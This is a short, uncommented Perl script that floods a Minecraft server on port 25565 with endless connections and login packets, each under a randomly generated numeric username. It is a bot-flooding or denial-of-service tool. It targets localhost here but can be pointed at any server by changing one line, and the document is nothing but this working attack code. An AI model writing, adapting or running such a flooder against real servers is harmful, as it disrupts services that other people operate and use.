use Socket;
$host = '127.0.0.1';
$port = 25565;
$protocol = chr(47);
$connects = 0;
while (1) {
  $username = 1111111111 + int(rand(9999999999 - 1111111111));
  socket($sock, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
  connect($sock , sockaddr_in($port, inet_aton($host)));
  $connects += 1;
  print "[$username/$connects]\n";
  send($sock , "\x06\x00$protocol\x00\x00\x00\x02" , 0);
  send($sock , "\x0c\x00\n$username", 0);
  sleep(0.01);
  close($sock);
}
